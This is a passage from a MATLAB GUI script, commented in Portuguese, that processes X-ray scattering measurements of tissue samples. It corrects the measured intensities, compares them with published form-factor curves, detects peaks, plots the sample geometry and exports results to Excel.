       plot(Qlinha,obtido_,'r',Qlinha,teorico-dif,'b',Q2linha,teorico2-dif2,'b')
       legend('Experiemental','by M E Peplow et al','by D. E. Peplow and K. Verghese')
       axis tight
       grid on
subplot(4,1,4)
       expValue=floor(log10(max(dadosSelecionados(:,2))));
       h20ShitAux = h20Shit2.*power(1E1,expValue(1));
       h20ShitAux2= h20Shit3.*power(1E1,expValue(1));
       origi_ = dadosSelecionados(1:fator:end,2);
       dif1= origi_(1)-h20ShitAux(1);
       dif2= origi_(1)-h20ShitAux2(1);
       dif1=0;
       dif2=0;
       plot(Qlinha,origi_,'r',Qlinha,h20ShitAux+dif1,'b',Q2linha,h20ShitAux2+dif2,'b')
       legend('Experiemental sem corrigir ','by M E Peplow et al','by D. E. Peplow and K. Verghese')
       axis tight
       
       grid on
       
        end
      
              if(isequal(tipoSelecionado,'Adenoma       '))
             
                if(mostarJanela>0)
                figure(15)
                else
                axes('parent',tab3_4)
                end
                Aden =  [0.76	0.76	0.76	0.76	0.76	0.77	0.771	0.791	0.879	0.936	1.082	1.237	1.33	1.411	1.517	1.683	1.708	1.618	1.56	1.466	1.422	1.383	1.367	1.36	1.281	1.156	1.073	0.873	0.825	0.8	0.787	0.772	0.748	0.715	0.674	0.623	0.572	0.546	0.525	0.516	0.497	0.487	0.478	0.454	0.422	0.378	0.406	0.391];
                Aden2 = [8.19E-01	8.19E-01	8.19E-01	8.19E-01	8.19E-01	9.67E-01	1.13E+00	1.25E+00	1.25E+00	1.46E+00	1.81E+00	2.07E+00	1.89E+00	1.71E+00	1.67E+00	1.71E+00	1.71E+00	1.65E+00	1.55E+00	1.49E+00	1.44E+00	1.41E+00	1.32E+00	1.22E+00	1.10E+00	9.06E-01	8.44E-01	7.94E-01	7.96E-01	7.93E-01	8.02E-01	7.66E-01	7.37E-01	7.10E-01	6.65E-01	6.41E-01	6.12E-01	5.85E-01	5.65E-01	5.44E-01	5.13E-01	4.89E-01	4.72E-01	4.28E-01];
               
               fator1=length(Q)/length(Aden );
               fator2=length(Q)/length(Aden2);
               
               Qlinha =Q(1:fator1:end);
               Q2linha=Q(1:fator2:end);
               
               obtido_   = plotCorrigido(1:fator1:end);
               obtido_2  = plotCorrigido(1:fator2:end);
               
               obitidoAux1 = obtido_.*(-1);
               obitidoAux2 = obtido_2.*(-1);
%                figure(55)
                      

                tam  = length(obtido_ );
                tam2 = length(obtido_2);
                
                if(max(obtido_)<max(Aden))
                 expValue1=floor(log10(max(obtido_)))+0.5;
                else
                 expValue1=floor(log10(max(obtido_)))
                end
                if(max(obtido_2)<max(Aden2))
                 expValue2=floor(log10(max(obtido_2)))+0.5;
                else
                 expValue2=floor(log10(max(obtido_2)))
                end
                
               [   pks,locs]     = findpeaks(obitidoAux1,Qlinha,'MinPeakDistance',2);
               [   pks2,locs2]     = findpeaks(obitidoAux2,Q2linha,'MinPeakDistance',2);
               
               if(obtido_(1)> obtido_(5))
               obtido_(1:locs(1))= (-1).*pks(1);
               end
               if(obtido_2(1)> obtido_2(5))
               obtido_2(1:locs2(1))= (-1).*pks2(1);(1);
               end
               
                 
               teorico = (Aden.*power(1E1,expValue1(1)));
               teorico2= (Aden2.*power(1E1,expValue2(1)));
               
               dif = teorico(1)-obtido_(1);
               dif2= teorico2(1)-obtido_(1);
              
subplot(2,1,1)
       plot(Qlinha,obtido_,'--r',Qlinha,teorico-dif,'b')
       axis tight
       grid on
       title('Comparação Fator de Forma Experimental X Teérico')
       legend('Experiemental','by M E Peplow et al')
subplot(2,1,2)
       plot(Q2linha,obtido_2,'--r',Q2linha,teorico2-dif2,'b')
       axis tight
       legend('Experiemental','by D. E. Peplow and K. Verghese')
       grid on
               
              end
              if(isequal(tipoSelecionado,'Adiposo       '))
                  
                if(mostarJanela>0)
                figure(15)
                else
                axes('parent',tab3_4)
                end
                
                
                Adip =  [1.02	1.02	1.02	1.02	1.02	1.02	1.032	1.106	1.259	1.599	2.032	2.349	2.094	1.667	1.433	1.297	1.216	1.109	1.089	1.051	1.049	1.03	1.042	1.013	1.006	0.954	0.907	0.795	0.722	0.682	0.654	0.638	0.634	0.633	0.628	0.601	0.558	0.53	0.498	0.464	0.439	0.427	0.421	0.411	0.395	0.395	0.365	0.355];
               fator1=length(Q)/length(Adip );
               
               Qlinha =Q(1:fator1:end);
               
               obtido_   = plotCorrigido(1:fator1:end);
               obitidoAux1 = obtido_.*(-1);

                tam  = length(obtido_ );

                
                if(max(obtido_)>max(Adip))
                 expValue1=floor(log10(max(obtido_)))+0.5;
                else
                 expValue1=floor(log10(max(obtido_)))
                end
                
               [   pks,locs]     = findpeaks(obitidoAux1,Qlinha,'MinPeakDistance',2)
                           
               if(obtido_(1)> obtido_(5))
               obtido_(1:locs(1))= (-1).*pks(1);
               end
                 
               teorico = (Adip.*power(1E1,expValue1(1)));
 
               dif = teorico(1)-obtido_(1);
      
       plot(Qlinha,obtido_,'--r',Qlinha,teorico-dif,'b')
       axis tight
       grid on
       title('Comparação Fator de Forma Experimental X Teérico')
       legend('Experiemental','by M E Peplow et al')
                

              end
              if(isequal(tipoSelecionado,'Normal'))

              end
              if(isequal(tipoSelecionado,'Adenocarcenoma'))

              end
       
mostarJanela= get(handles.PlotarEmNovaJanela,'Value'); 
if(mostarJanela>0)
figure(2)
else
 axes('parent',tab2)
end
%         a(1)=a(1);
        n=plotCorrigido(a(1):end);
        ntotal=length(n(:,1));
        fatr=str2double(get(handles.normalr,'String'));
        expValue=floor(log10(max(n)))+fatr;
%         power(1E1,expValue)
        for x=1:length(n)
            noramlizada= (((1/ntotal)*(normalizacao1(x,1))/n(x)));
            
            aa(x) = sum(noramlizada).*power(1E1,expValue);
        end
        bb=aa;
        noramlizada = (((1/ntotal).*(normalizacao1(round(a(1)):end,1)./n(:,1))));
        
           hold off
subplot(4,1,1)
cla
        curvexy = [Q(a(1):end) n];
        mapxy   = [Q(a(1):end) normalizacao1(round(a(1)):end,1)];
       [xy,distance,t] = distance2curve(curvexy,mapxy,'linear');
        plot(mapxy(:,1),mapxy(:,2),'.-k','LineWidth',1.5)
        hold on
      
        ccc=rand(3,1);
        plot(xy(:,1),xy(:,2),'LineWidth',1.5,'color','r')
        line([mapxy(:,1),xy(:,1)]',[mapxy(:,2),xy(:,2)]','color',ccc);
%       plot(Q(a(1):end),normalizacao(a(1):end),'r',Q(a(1):end),plotCorrigido(a(1):end),'b' )
        axis tight
        grid on

subplot(4,1,2)
cla
        plot(Q(a(1):end),bb,'r')
        axis tight
        yy = bb(1)- plotCorrigido(round(a(1)));
%         if(0>yy)
            plotFinal = plotCorrigido;
            plotFinal(a(1):end) =bb-yy;
%         else
%             plotFinal = plotCorrigido;
%             plotFinal(a(1):end) =noramlizada+yy;
%         end
        grid on
        
subplot(4,1,3)
cla
        plot(mapxy(:,1),mapxy(:,2),'.-k','LineWidth',1.5)
        hold on
        plot(xy(:,1),xy(:,2),'LineWidth',1.5,'color','r')
        hold all
        plot( Q(a(1):end),bb-yy,'.b')
        axis tight
        grid on
        
subplot(4,1,4)
cla
        plot(Q ,plotFinal ,'r')
        axis tight
        grid on
%         hold on
 
        plotCorrigido = plotFinal;
        assignin('base','plotCorrigido',plotCorrigido);
        media= mean(plotCorrigido,1);
        
   if(mostarJanela>0)
        figure(3)
   else
        axes('parent',tab3)
   end
   hold off

        subplot(3,1,1)      
        cla
%                                findpeaks(plotCorrigido,Q,'MinPeakDistance',2);
% assignin('base','findps', findpeaks(plotCorrigido,Q,'Annotate','extents','WidthReference','halfheight','MinPeakDistance',2));
[pks,locs] = findpeaks(plotCorrigido(30:end,1),Q(30:end,1),'Annotate','extents','WidthReference','halfheight','MinPeakDistance',2);
%                 [   pks,locs]= findpeaks(plotCorrigido,Q,'MinPeakDistance',2);
                                 plot(Q,plotCorrigido,locs ,pks ,'^')
%                                hold on
%                                plot(w,p)
                               text(locs+.02,pks,num2str((1:numel(pks))'));
%                                axis tight
                                    xlim([min(Q) max(Q)])
                               grid on
                               title('picos com distancia min entre-picos (2)')
%                              xy = [pks,locs];
       subplot(3,1,2)
       cla
%                                findpeaks(plotCorrigido,Q,'MinPeakDistance',5);
                 [pks1,locs1]= findpeaks(plotCorrigido(30:end,1),Q(30:end,1),'Annotate','extents','WidthReference','halfheight','MinPeakDistance',5);
                  plot(Q,plotCorrigido,locs1,pks1,'^')
                               text(locs1+.02,pks1,num2str((1:numel(pks1))'));
                               xlim([min(Q) max(Q)])
                               grid on
                               title('picos com distancia min entre-picos (5)')
%                              xy1 = [pks1,locs1]; 
       subplot(3,1,3) 
       cla
%                                findpeaks(plotCorrigido,Q,'MinPeakHeight',media );
                 [pks2,locs2] = findpeaks(plotCorrigido(30:end,1),Q(30:end,1),'Annotate','extents','WidthReference','halfheight','MinPeakHeight',media ,'MinPeakDistance',5);
                  plot(Q,plotCorrigido,locs2,pks2,'^')
                               text(locs2+.02,pks2,num2str((1:numel(pks2))'));
                               xlim([min(Q) max(Q)])
                               grid on
%                                axis([min(Q(:)) max(Q(:)) min(plotCorrigido) max(plotCorrigido)+5E-25 ])
                               hold on
                               plot(Q,media*ones(length(Q),1),'-.','LineWidth',2);
                               title('picos superiores a média e d. entre-picos (5)')
%                              set(gca,'XTick',[0:5: max(Q(:))],'XTickLabelRotation',45,'YTick',[0:1500: max(plotCorrigido)+1500])
%                              xy2= [pks2,locs2] ;
                               hold off
                
%            Define variaveis presentes na tabela 2 (Tabela canto inferior a esquerda)
             ColunaNomes = {'Theta' 'q' 'I'};
             set(handles.tabela2,'ColumnName',ColunaNomes);
             set(handles.tabela2, 'ColumnWidth',{40},'units','Normalized');
             set(handles.tabela2,'Data',[dadosSelecionados(:,1)/2 Q dadosSelecionados(:,2)]);
%            Define variaveis presentes na tabela 3 (Tabela canto inferior a direita)
             ColunaNomes = {'I"'};
             set(handles.tabela3,'ColumnName',ColunaNomes);
             set(handles.tabela3,'ColumnWidth',{40},'units','Normalized');
                        
  assignin('base','plotFinal',plotFinal);           
  if(get(handles.detm,'Value')>0)
   figure(99)
    for x=1:8
    x=x/2;
    if(max(normalizacao)>max(soPraisoo(2:end,1)))
            normalizacao1=normalizacao/(1.5*x*0.5);
            curvexy = [Q soPraisoo];
            mapxy   = [Q normalizacao1];
                  plot(curvexy(:,1),curvexy(:,2),'b',mapxy(:,1),mapxy(:,2),'r')
                    grid on
                    axis tight
                    hold all
                    pause(0.5)
    end
    end
 end  
             
function stat_Callback(~, ~, ~)
 global  ...
 dadosSelecionados ...
               ;
           
           %usando média movel
          [tam, ~]=size(dadosSelecionados(:,2));
          c = smooth( dadosSelecionados(:,2));
          [~, ~]=size(c);
          C = reshape(c,tam,1);
          figure
%           subplot(3,1,1)
          plot(dadosSelecionados(:,2),':');
          hold on
          plot(C,'-');
          title('teste')
% ------------------------funções internas-------------------------------%
function graficosCorr_Callback(~, ~, ~)
global  volume              ...
        QPOLAR              ...
        Polarizacao         ...
        Q                   ...
        IARpa4              ...
        IARpa3              ...
        IARpa2              ...
        IARpa1              ...
        PA_04_Antes         ...     
        PA_03_Antes         ...   
        PA_02_Antes         ...    
        PA_01_Antes         ... 
        PA_01_PLS_1MIN      ...
        PA_02_PLS           ...
        PA_03_PLS           ...
        PA_04_PLS           ... 
        K                   ...
        IfilmePA4   ...   
        IfilmePA3   ...   
        IfilmePA2   ...   
        IfilmePA1   ...   
        IFilme ...     
        IAR        ...   
        Ipa01      ...   
        Ipa02      ...   
        Ipa03       ...   
        Ipa04      ...   
        IPA    ...   
        caminhoDosArquivosDeTexto ;
    
assignin('base','volume',        volume              );
assignin('base','QPOLAR',        QPOLAR              );
assignin('base','Polarizacao',        Polarizacao         );
assignin('base','Q',        Q                   );
assignin('base','IARpa4',        IARpa4              );
assignin('base','IARpa3',        IARpa3              );
assignin('base','IARpa2',        IARpa2              );
assignin('base','IARpa1',        IARpa1              );
assignin('base','PA_04_Antes',        PA_04_Antes         );     
assignin('base','PA_03_Antes',        PA_03_Antes         );   
assignin('base','PA_02_Antes',        PA_02_Antes         );    
assignin('base','PA_01_Antes',        PA_01_Antes         ); 
assignin('base','PA_01_PLS_1MIN',        PA_01_PLS_1MIN      );
assignin('base','PA_02_PLS',        PA_02_PLS           );
assignin('base','PA_03_PLS',        PA_03_PLS           );
assignin('base','PA_04_PLS',        PA_04_PLS           ); 
assignin('base','K',        K                   );
    

     hFig = figure;
     tabplot('Correção do volume',hFig,'top');
     plot(volume);
     legend('G(q)')
     xlabel('q(nm^-^1)'); 
     ylabel('G(q) mm^3');
     grid on
     title('Correção do volume da amostra irradiada');

     tabplot('Polarização',hFig);
     plot(QPOLAR,Polarizacao);
     legend('P(q)')
     xlabel('q(nm^-^1)'); 
     ylabel('P(q)');
     title('Fator de Polarização');
     grid on
    
      %         IfilmePA4   ...   
%         IfilmePA3   ...   
%         IfilmePA2   ...   
%         IfilmePA1   ...   
%         IFilme ...   
%         IARpa4     ...   
%         IARpa3      ...   
%         IARpa2     ...   
%         IARpa1     ...   
%         IAR        ...   
%         Ipa01      ...   
%         Ipa02      ...   
%         Ipa03       ...   
%         Ipa04      ...   
%         IPA    ...    

     
     tabplot('Correção da intensidade do AR',hFig);
     
     subplot(4,1,1)
     plot(Q,IARpa4,'k',Q,IARpa3,'c',Q,IARpa2,'b',Q,IARpa1,'g',Q,IAR,'r');
     grid on
     axis auto
 
     title('Intensidades Ar');
     legend('IAR PA01','IAR PA02','IAR PA03','IAR PA04','IAR Média');
     hold off
     
     subplot(4,1,2)
     
     plot(Q,PA_04_Antes,'k',Q,PA_04_Antes,'c',Q,PA_02_Antes,'b',Q,PA_01_Antes,'g')
     title('Int. plastico + Ar + PA - sem corrigir' );
     xlabel('q(nm^-^1)');
     ylabel('Int. do feixe (u.a.)');
     legend('PA 04','PA 04','PA 02','IfilmePA1')
     axis auto
     
     
     subplot(4,1,3)
     plot(Q,IfilmePA4,'k',Q,IfilmePA3,'c',Q,IfilmePA2,'b',Q,IfilmePA1,'g',Q,IFilme ,'r')
     title('Int. plastico - corrigido');
          xlabel('q(nm^-^1)');
     ylabel('Int. do feixe (u.a.)');
     legend('IfilmePA4','IfilmePA3','IfilmePA2','IfilmePA1','IFilme')
     axis auto
 
      
     subplot(4,1,4)
    
     plot(Q,Ipa01,'k',Q,Ipa02,'c',Q,Ipa03,'b',Q,Ipa04,'g',Q,IPA ,'r')
     title('Int. Pa  ');
          xlabel('q(nm^-^1)');
     ylabel('Int. do feixe (u.a.)');
     legend('Ipa01','Ipa02','Ipa03','Ipa04','IPA Médio')
     axis auto
      
        tabplot('Sobreposição',hFig);
        prova= IAR+IFilme+IPA;
       
        plot(Q,IAR,'k',Q,IFilme,'c',Q,IPA,'b',Q,prova,'r' )
        title(' ');
        xlabel('q(nm^-^1)');
        ylabel('Int. do feixe (u.a.)');
        legend('IAR','IFilme','IPA','Soma')
        axis auto

     
     
     
     tabplot('Dados de Energia I ',hFig);
     figgg = strcat(caminhoDosArquivosDeTexto,'\gp1.png');
     I2=imread(figgg);
     imshow(I2);
     
 
        tabplot('K',hFig)
        plot(Q, K)
        axis([min(Q(:)) max(Q(:)) min(K) max(K)])
             xlabel('q(nm^-^1)');
        ylabel('Int. do feixe (u.a.)');
        legend('K(q)')
        tabplot('K(q)*P(q)*A(q)',hFig)
        
        
        
        subplot(3,1,1)
        plot(Q,Polarizacao,'c',Q,volume,'b',Q,K','k')
        title('K(q) P(q) A(q)')
        legend('Polarização','A','K')
        axis([min(Q(:)) max(Q(:)) min([min(Polarizacao),min(volume),min(K)]) max([max(Polarizacao),max(volume),max(K)])])
        fc=Polarizacao(:,1).*volume(:,1);
        grid on
        
        
        subplot(3,1,2)
        plot(Q,fc,'r','LineWidth',2)
        legend('K*Polarizacao*volume')
        title('correção P*A')
        axis([min(Q(:)) max(Q(:)) min(fc) max(fc)])
        grid on
        subplot(3,1,3)
        fc2=1./fc(:,1);
        plot(Q,fc2,'b','LineWidth',2)
        legend('[Polarizacao*volume]^-1')
        title('correção (P*A) ^(^-^1^)')
        axis([min(Q(:)) max(Q(:)) min(fc2) max(fc2)])    
        grid on
function padrao_Callback  (hObject, ~, handles)
global Q ...
       qCritico ...
       tab5 ...
       tabgp ...
       TETA  ...
       Tar...
       Tpvc...
       Tamos...
       volume ...
       angCritico ...
       Tpa;
   tabgp.SelectedTab = tab5;
   hold off
   mostarJanela= get(handles.PlotarEmNovaJanela,'Value');  
   
         
         
         
if(get(hObject,'Value')>0)
       
    setOFFeddits(handles);
    atualiza(handles);
    
%      for x=1:size(Q)
%             altura(x,1) = tan(Q(x,1)*(pi()/180));
%      end
     

       valorA = str2double(get(handles.aa, 'String'));
       valorB = str2double(get(handles.bb, 'String'));
       valorH = str2double(get(handles.hhh,'String'));
       
                altura = rad2deg(atan(valorA/(2*valorH)))
  count=0;
  okay=false;
%   aaaa = Q(round(altura))

             for x=1:length(Q)
                if(altura< TETA(x,1) && ~okay)
                 angCritico =round(count)
                 
                 qCritico = Q(count,1)
                 count
                 okay = true;
                end
                 count = count+1;
             end
          
         
    [miuAR,miuPVC,miuAMO,miuPA,lxAR,lxPVC,lxAMOS,lxPA,Tar,Tpvc,Tamos,Tpa] = getTodososvalores(handles,Q);

    
    CompX = str2double(get(handles.bb,'String'));
    CompY = str2double(get(handles.aa,'String'));
    CompZ = str2double(get(handles.hhh,'String'));
    
     volume = (CompX*CompY).*tan(TETA(:,1).*(pi()/180));
%     Liteste= cos(TETA(:,1).*(pi()/180)).*sin(TETA(:,1).*(pi()/180))/(8*exp(1.069156))
%     Litest1= cos(TETA(:,1).*(pi()/180))/exp(1.069156*CompX)
%     
%     volume = 1/CompY.*Litest1.^2.*(exp(-2*1.034*CompX)./Liteste)
             
          
          
            figure (33)
            plot(volume)
            pause(22)
%            
    resto = 2.1 - CompX; 
    CompX = CompX + resto;

        if(mostarJanela>0)
        hFig = figure;
        else
        ax = axes('Parent', tab5);
        cla reset
        ax.BoxStyle = 'full';
        ax.XAxisLocation = 'top';
        ax.Position = [0.1 0.4 1.0 0.6];
        
        end
    X = [ 0 ; CompX ; CompX ; 0     ; 0 ];
    Y = [ 0 ; 0     ; CompY ; CompY ; 0 ];
    Z = [ 0 ; 0     ; 0     ; 0     ; 0 ];
% axis off
    if(mostarJanela>0)
    
    tabplot('   1   ',hFig,'top');
    grid on
    end
            hold on;
            plot3(X-CompX/2,Y-0.5*CompY,Z);   
            plot3(X-CompX/2,Y-0.5*CompY,Z+CompZ,'LineWidth',2.5); 
            set(gca,'View',[-50,33]);

            for k=1:length(X)-1
             plot3([X(k)-CompX/2;X(k)-CompX/2],[Y(k)-0.5*CompY;Y(k)-0.5*CompY],[0;CompZ],'LineWidth',2.5);
            end
            scatter3(7*35.*rand(300,1)/100-CompX/2,7*35.*rand(300,1)/100-3*CompY,35.*rand(300,1)/100-0.125,'red');
            axis([-CompX CompX -CompX CompX 0 1]);
% axis off
% axis tight
    if(mostarJanela>0)
    tabplot('   2   ',hFig,'top');
    axis([-CompX CompX -CompX CompX 0 1]);
    grid on
    end
            grid on
            hold on
            nPhi = 256;
            nRho = 32;
            [X, Y, Z] = cylinder([linspace(0,CompX-0.1, nRho) CompX.*ones(1, nRho)], nPhi);
            Z(1:nRho,:) = 0;
            Z(nRho+1:end,:) = CompZ;
            surf(X,Y,Z, 'FaceColor', [0.97 0.97 0.97], 'FaceLighting', 'phong','EdgeColor', 'none');
           
            hold on
            [X,Y,Z] = cylinder(linspace(0, 2, nRho), nPhi);
            Z(:,:) = CompZ-0.03;
            surf(X, Y, Z, 'FaceColor', [0 0.5 1], 'FaceLighting', 'phong', 'FaceAlpha',0.5, 'EdgeColor', 'none');
            alpha(.2)
            camlight;
            hold off
% axis off
% axis tight
    if(mostarJanela>0)
            tabplot('   3   ',hFig,'top');
            grid on
            axis([-CompX CompX -CompX CompX 0 1]);
            hold off
            hold on;
            X = [ 0 ; CompX ; CompX ; 0     ; 0 ];
            Y = [ 0 ; 0     ; CompY ; CompY ; 0 ];
            Z = [ 0 ; 0     ; 0     ; 0     ; 0 ];
            plot3(X-CompX/2,Y-0.5*CompY,Z);   
            plot3(X-CompX/2,Y-0.5*CompY,Z+CompZ,'LineWidth',2.5); 
            set(gca,'View',[-28,35]); 

            for k=1:length(X)-1
                 plot3([X(k)-CompX/2;X(k)-CompX/2],[Y(k)-0.5*CompY;Y(k)-0.5*CompY],[0;CompZ],'LineWidth',2.5);
            end
            scatter3(7*35.*rand(300,1)/100-CompX/2,7*35.*rand(300,1)/100-3*CompY,35.*rand(300,1)/100,'g');
            nPhi = 256;
            nRho = 32;
            [X, Y, Z] = cylinder([linspace(0, 2, nRho) CompX.*ones(1, nRho)], nPhi);
            Z(1:nRho,:) = 0;
            Z(nRho+1:end,:) = CompZ;
            surf(X,Y,Z, 'FaceColor', [0.97 0.97 0.97], 'FaceLighting', 'phong','EdgeColor', 'none');
            hold on
            [X,Y,Z] = cylinder(linspace(0, 2, nRho), nPhi);
            Z(:,:) = CompZ -0.03;
            surf(X, Y, Z, 'FaceColor', [0 0.5 1], 'FaceLighting', 'phong', 'FaceAlpha',0.5, 'EdgeColor', 'none');
            camlight;
            hold off
    end

else
    setONeddits(handles);
end
function plus_Callback    (hObject, eventdata, handles)
global mais ...
       tabgp ;
if (mais<1)
set(hObject,'String','-');
set(tabgp,'Visible','off');
mais = 1;

else
set(hObject,'String','+');
set(tabgp,'Visible','on');
mais = 0;


end
function expotAmos_Callback(hObject, eventdata, handles)
global caminhoDosArquivosDeTexto ...
       pastaSelecionada ...
       angCritico ...
       Tar ...
       IAR ...
       Arqselecionado ...
       PA_01_PLS_1MIN ...
       PA_02_PLS ...
       PA_03_PLS ...
       Tpvc ...
       PA_04_PLS ...
       IFilme ...
       PA_03_VZ_REP ...
       PA_01_VZ ...
       PA_02_VZ ...
       PA_04_VZ ...
       Tamos ...
       IPA ...
       Q ...
       K...
       Polarizacao...
       volume...
       TETA ...
       tipoSelecionado ...
       pa1fr...
       pa2fr...
       pa3fr...
       pa4fr...
       paMedio...
       fc2...
       r0;
   
     pa1fr  =zeros(length(Q),1);
     pa2fr  =zeros(length(Q),1);
     pa3fr  =zeros(length(Q),1);
     pa4fr  =zeros(length(Q),1);
     paMedio=zeros(length(Q),1);
%      
%      expotarTipoNomeFinal = strcat('amostras_',tipoSelecionado,'_',date,'.xlsx');
   %      startingFolder       = strcat( caminhoDosArquivosDeTexto ,'arquivosSalvos');
%      
%      defaultFileName       = fullfile(startingFolder, expotarTipoNomeFinal );
%     [baseFileName, expotarTipoNome] = uiputfile(defaultFileName, 'Salvar Como' );
%         if (baseFileName == 0)
%              return;
%         end

     
     pa1fr(1  :angCritico,1) = Tar(1:angCritico,1  ).*IAR(1:angCritico  ,1) +  PA_01_PLS_1MIN(1:angCritico  ,1);
     pa1fr(angCritico:end,1) = Tar(angCritico:end,1).*IAR(angCritico:end,1) +  PA_01_PLS_1MIN(angCritico:end,1) - Tpvc(angCritico:end,1).*Tamos(angCritico:end,1).*PA_01_VZ(angCritico:end,1);

     pa2fr(1  :angCritico,1) = Tar(1:angCritico,1  ).*IAR(1:angCritico  ,1) +  PA_02_PLS(1:angCritico  ,1);
     pa2fr(angCritico:end,1) = Tar(angCritico:end,1).*IAR(angCritico:end,1) +  PA_02_PLS(angCritico:end,1) - Tpvc(angCritico:end,1).*Tamos(angCritico:end,1).*PA_02_VZ(angCritico:end,1);
     
     pa3fr(1  :angCritico,1) = Tar(1:angCritico,1  ).*IAR(1:angCritico  ,1) +  PA_03_PLS(1:angCritico  ,1);
     pa3fr(angCritico:end,1) = Tar(angCritico:end,1).*IAR(angCritico:end,1) +  PA_03_PLS(angCritico:end,1) - Tpvc(angCritico:end,1).*Tamos(angCritico:end,1).*PA_03_VZ_REP(angCritico:end,1);
     
     pa4fr(1  :angCritico,1) = Tar(1:angCritico,1  ).*IAR(1:angCritico  ,1) +  PA_04_PLS(1:angCritico  ,1);
     pa4fr(angCritico:end,1) = Tar(angCritico:end,1).*IAR(angCritico:end,1) +  PA_04_PLS(angCritico:end,1) - Tpvc(angCritico:end,1).*Tamos(angCritico:end,1).*PA_04_VZ(angCritico:end,1);

     paMedio(     1       :angCritico,1) = Tar(1:angCritico  ,1).*IAR(1:angCritico  ,1) +  IFilme(1:angCritico  ,1);
     paMedio(angCritico   :end       ,1) = Tar(angCritico:end,1).*IAR(angCritico:end,1) +  IFilme(angCritico:end,1) - Tpvc(angCritico:end,1).*Tamos(angCritico:end,1).*IPA(angCritico:end,1);

        
     pa1fr=pa1fr(:,1)./Tpvc(:,1);
     pa2fr=pa2fr(:,1)./Tpvc(:,1);
     pa3fr=pa3fr(:,1)./Tpvc(:,1);
     pa4fr=pa4fr(:,1)./Tpvc(:,1);
     paMedio=paMedio(:,1)./Tpvc(:,1);

     fc =K(:,1).*Polarizacao(:,1).*volume(:,1);
     fc2=1./(fc);
     fc2(1:10,1)=1;
     r0 =((2.83E-15^2)/2).*(1+power(cos(TETA(:,1)*pi()/40),2));


   
   arquivoSelecionados = cellstr(get(handles.listbox1,'String'));
   cont=0;
  
   auxSemCorr = zeros(length(PA_02_PLS),1)';
   auxCorrigida  = zeros(length(PA_02_PLS),1)';
   auxCorrigidaMedia= zeros(length(PA_02_PLS),1)';
   auxImedida= zeros(length(PA_02_PLS),1)';
   auxImedidaMedia= zeros(length(PA_02_PLS),1)';
   auxInormalizacao = zeros(length(PA_02_PLS),1)';
   auxFinalmediadaMaisNorm = zeros(length(PA_02_PLS),1)' ;
   auxFinalmediadaMaisNormMedia = zeros(length(PA_02_PLS),1)' ;
   normalizaAmostra = zeros(length(PA_02_PLS),1)' ;
   normalizaMedia   = zeros(length(PA_02_PLS),1)' ;
   
            %    data1 = zeros(2,length(arquivoSelecionados))' ;
% %                for x=1:length(arquivoSelecionados)
              
                [tipoPortaAmostra,~] = strsplit(char(Arqselecionado(1)),{' ','.txt'},'CollapseDelimiters',true);
                txtSelect = char((strcat(caminhoDosArquivosDeTexto,pastaSelecionada,'\',Arqselecionado(1))));
                 [tipo,~] = strsplit(pastaSelecionada,'\','CollapseDelimiters',true);

                 data1(1,:)= [tipoPortaAmostra(1) tipoPortaAmostra(2) tipo(2)];
            %      cellstr(data1{x})
  expotarTipoNome= char(strcat(tipoPortaAmostra(1),'_',tipoSelecionado,'_',date,'.xlsx'));

                if( isempty(char(Arqselecionado(1))))
                    aux1 =strcat('Selecione uma opção valida, a pasta: [ ',caminhoDosArquivosDeTexto,pastaSelecionada,'] parece estar vazia ')
                     uiwait(warndlg(aux1));
                     return          
                end

%                     [valores, ...
%                      plotFinal, ...
%                      plotFinal2,...
%                      normalizacao,...
%                      Iamostra, ...
%                      IamostraMedia, ...
%                      plotCorrigido,...
%                      plotCorrigidoMedio,...
%                      noramlizada, ...
%                      noramlizada2] =     readFile(txtSelect,tipoPortaAmostra(2),handles);

        [valores, ...
         Iamostra, ...
         IamostraMedia, ...
         plotCorrigido,...
         plotCorrigidoMedio] = readFile(txtSelect,tipoPortaAmostra(2),handles);


               auxSemCorrigir (1,:)   =      valores;
               auxCorrigida(1,:)      =      plotCorrigido;
               auxCorrigidaMedia(1,:) =      plotCorrigidoMedio;
               auxImedida(1,:)        =      Iamostra;
               auxImedidaMedia(1,:)   =      IamostraMedia;
%                auxInormalizacao(1,:)  =      normalizacao;
%                auxFinalmediadaMaisNorm(1,:) = plotFinal;
%                auxFinalmediadaMaisNormMedia(1,:) = plotFinal2;
% 
%                cont = cont +1;
%                end
      
   h = waitbar(0,'Exportando resultados para excel..');
   warning('off','MATLAB:xlswrite:addSheet')
   i=0;

%     xlswrite (expotarTipoNome, data1,'Corr. (esxp+norm)','A1');
%     i=i+1;  waitbar(i/16);
%     xlswrite (expotarTipoNome, data1,'Corr.(esxp+norm)Média','A1');
%     i=i+1;  waitbar(i/16);
    xlswrite (expotarTipoNome, data1,'semCorreção','A1');
    i=i+1;  waitbar(i/10);
    xlswrite (expotarTipoNome, data1,'correção expurias','A1');
    i=i+1;  waitbar(i/10);
    xlswrite (expotarTipoNome, data1,'correção expurias Média','A1');
    i=i+1;  waitbar(i/10);
    xlswrite (expotarTipoNome, data1,'Im(só transmição)','A1');
    i=i+1;  waitbar(i/10);
    xlswrite (expotarTipoNome, data1,'Im(só trans) Média','A1');
    i=i+1;  waitbar(i/10);
%     xlswrite (expotarTipoNome, data1,'normalização p.amostra','A1');
%     i=i+1;  waitbar(i/16);
    
%     xlswrite (expotarTipoNome, auxFinalmediadaMaisNorm,'Corr. (esxp+norm)','D1');
%     i=i+1;  waitbar(i/16);
%     xlswrite (expotarTipoNome, auxFinalmediadaMaisNormMedia,'Corr.(esxp+norm)Média','D1');
%     i=i+1;  waitbar(i/16);
    xlswrite (expotarTipoNome, auxSemCorrigir,'semCorreção','D1');
    i=i+1;  waitbar(i/10);
    xlswrite (expotarTipoNome, auxCorrigida,'expurias+r0','D1');
    i=i+1;  waitbar(i/10);
    xlswrite (expotarTipoNome, auxCorrigidaMedia,'espurias+r0 Média','D1');
    i=i+1;  waitbar(i/10);
    xlswrite (expotarTipoNome, auxImedida,'Im(só transmição)','D1');
    i=i+1;  waitbar(i/10);
    xlswrite (expotarTipoNome, auxImedidaMedia,'Im(só trans) Média','D1');
    i=i+1;  waitbar(i/10);
%     xlswrite (expotarTipoNome, auxInormalizacao,'normalização p.amostra','D1');
%     i=i+1;  waitbar(i/16);
         
   delete(h)  
function export_Callback  (~, ~, handles)
global caminhoDosArquivosDeTexto ...
       pastaSelecionada ...
       angCritico ...
       Tar ...
       IAR ...
       PA_01_PLS_1MIN ...
       PA_02_PLS ...
       PA_03_PLS ...
       Tpvc ...
       PA_04_PLS ...
       IFilme ...
       PA_03_VZ_REP ...
       PA_01_VZ ...
